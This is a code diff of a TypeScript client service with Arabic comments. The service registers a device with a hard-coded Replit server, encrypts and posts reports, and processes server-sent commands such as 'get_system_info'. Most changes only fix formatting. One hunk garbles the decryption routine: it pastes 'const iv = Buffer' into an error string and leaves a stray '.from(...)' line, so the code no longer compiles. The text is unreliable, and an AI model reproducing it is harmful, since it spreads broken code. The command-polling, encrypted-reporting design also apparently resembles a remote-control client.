@@ -8,7 +8,6 @@ import crypto from 'crypto';
 const SERVER_CONFIG = {
   // ✅ رابط الخادم على Replit
   URL: 'https://624bf379-8f9d-4beb-8812-30e54011173d-00-2416evv3w9ocf.janeway.replit.dev',
-  
   TIMEOUT: 10000, // 10 ثواني
 };
 
@@ -47,7 +46,8 @@ class ClientService {
     this.axiosInstance = axios.create({
       baseURL: this.config.serverUrl,
       timeout: SERVER_CONFIG.TIMEOUT,
-      headers: {        'Content-Type': 'application/json',
+      headers: {
+        'Content-Type': 'application/json',
       },
     });
 
@@ -62,7 +62,7 @@ class ClientService {
     try {
       console.log('🔄 جاري محاولة التسجيل...');
       console.log('🌐 الخادم:', this.config.serverUrl);
-      
+
       const response = await this.axiosInstance.post('/api/clients/register', {
         clientId: this.config.clientId,
         deviceInfo,
@@ -79,7 +79,7 @@ class ClientService {
       }
     } catch (error: any) {
       console.error('❌ فشل في التسجيل:', error.message);
-      
+
       // معالجة أنواع الأخطاء المختلفة
       if (error.response) {
         console.error('📡 حالة الخادم:', error.response.status);
@@ -87,15 +87,16 @@ class ClientService {
       } else if (error.request) {
         console.error('🔌 لم يتم استقبال استجابة من الخادم');
         console.error('🌐 تحقق من:');
-        console.error('  - الخادم يعمل:', this.config.serverUrl);
-        console.error('  - الاتصال بالإنترنت');
+        console.error(' - الخادم يعمل:', this.config.serverUrl);
+        console.error(' - الاتصال بالإنترنت');
       } else {
         console.error('⚠️ خطأ في الطلب:', error.message);
       }
-      
+
       throw error;
     }
   }
+
   /**
    * تشفير البيانات باستخدام AES-256-CBC ✅
    */
@@ -107,7 +108,7 @@ class ClientService {
 
       const cipher = crypto.createCipheriv(algorithm, keyBuffer, iv);
       cipher.setAutoPadding(true);
-      
+
       // ✅ استخدام base64 للتشفير
       let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'base64');
       encrypted += cipher.final('base64');
@@ -131,10 +132,10 @@ class ClientService {
 
       // ✅ CBC يتكون من جزأين فقط: iv و encrypted
       if (parts.length < 2) {
-        throw new Error('صيغة البيانات المشفرة غير صحيحة');
+        throw new Error('صيغة البيانات المشفرة غير صحيحة const iv = Buffer');
       }
 
-      const iv = Buffer.from(parts[0], 'hex');
+     .from(parts[0], 'hex');
       // ✅ دعم التوافق مع الإصدارات السابقة
       const encrypted = parts.length === 3 ? parts[2] : parts[1];
 
@@ -145,7 +146,8 @@ class ClientService {
       decrypted += decipher.final('utf8');
 
       return JSON.parse(decrypted);
-    } catch (error) {      console.error('🔓 فشل في فك تشفير البيانات:', error);
+    } catch (error) {
+      console.error('🔓 فشل في فك تشفير البيانات:', error);
       throw error;
     }
   }
@@ -194,7 +196,8 @@ class ClientService {
 
       await this.axiosInstance.post('/api/clients/report', {
         deviceId: this.deviceId,
-        encryptedData,      });
+        encryptedData,
+      });
 
       console.log('✓ تم إرسال التقرير');
     } catch (error) {
@@ -244,6 +247,7 @@ class ClientService {
     for (const command of commands) {
       try {
         console.log(`⚙️ معالجة الأمر: ${command.type}`);
+
         let result;
         switch (command.type) {
           case 'get_system_info':
@@ -292,7 +296,8 @@ class ClientService {
   }
 
   /**
-   * الحصول على معلومات النظام   */
+   * الحصول على معلومات النظام
+   */
   private async getSystemInfo(): Promise<any> {
     return {
       deviceName: process.env.DEVICE_NAME || 'Android Device',
@@ -342,6 +347,7 @@ class ClientService {
   getDeviceId(): string {
     return this.deviceId;
   }
+
   /**
    * الحصول على مفتاح التشفير
    */
